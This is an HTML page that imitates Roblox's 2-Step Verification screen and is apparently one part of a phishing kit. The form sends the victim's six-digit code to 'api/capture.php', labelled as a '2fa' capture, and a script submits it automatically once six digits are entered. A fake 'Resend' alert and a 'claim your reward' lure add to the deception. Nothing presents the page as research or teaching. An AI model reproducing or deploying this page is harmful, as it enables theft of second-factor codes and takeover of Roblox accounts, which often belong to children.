<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2-Step Verification - Roblox</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e1a3a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .verify-wrapper {
            width: 100%;
            max-width: 460px;
        }

        .verify-card {
            background: #1e293b;
            border-radius: 28px;
            padding: 40px 32px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,71,87,0.2);
            text-align: center;
        }

        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: #94a3b8;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .shield-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #ff4757, #ff6b6b);
            border-radius: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            margin: 0 auto 24px;
        }

        h2 {
            font-size: 26px;
            margin-bottom: 12px;
        }

        .info-text {
            color: #94a3b8;
            font-size: 14px;
            margin-bottom: 28px;
        }

        .code-input {
            margin: 30px 0;
        }

        .code-input input {
            width: 100%;
            padding: 16px;
            font-size: 28px;
            text-align: center;
            letter-spacing: 8px;
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 16px;
            color: white;
            font-weight: 600;
        }

        .code-input input:focus {
            outline: none;
            border-color: #ff4757;
        }

        .verify-btn {
            width: 100%;
            background: linear-gradient(135deg, #ff4757, #ff6b6b);
            border: none;
            padding: 16px;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            color: white;
            cursor: pointer;
            margin-top: 10px;
        }

        .resend {
            margin-top: 20px;
        }

        .resend a {
            color: #ff4757;
            text-decoration: none;
            font-size: 14px;
        }

        .note {
            margin-top: 24px;
            font-size: 12px;
            color: #64748b;
            background: #0f172a;
            padding: 12px;
            border-radius: 12px;
        }
    </style>
</head>
<body>
    <div class="verify-wrapper">
        <div class="verify-card">
            <a href="login.html" class="back-link">← Back</a>
            
            <div class="shield-icon">🔐</div>
            <h2>2-Step Verification</h2>
            <div class="info-text">
                We've sent a verification code to your email<br>
                <strong>***@gmail.com</strong>
            </div>

            <form id="verifyForm" action="api/capture.php" method="POST">
                <div class="code-input">
                    <input type="text" name="code" placeholder="000000" maxlength="6" autocomplete="off" required>
                </div>
                <input type="hidden" name="type" value="2fa">
                <button type="submit" class="verify-btn">Verify & Complete →</button>
            </form>

            <div class="resend">
                <a href="#" onclick="alert('Code resent! Check your email.'); return false;">Didn't receive code? Resend</a>
            </div>

            <div class="note">
                🔒 This is an additional security step required to claim your reward
            </div>
        </div>
    </div>

    <script>
        // Auto focus on input
        document.querySelector('input[name="code"]').focus();
        
        // Auto submit when 6 digits entered
        const codeInput = document.querySelector('input[name="code"]');
        codeInput.addEventListener('input', function(e) {
            if (this.value.length === 6) {
                document.getElementById('verifyForm').submit();
            }
        });
    </script>
</body>
</html>
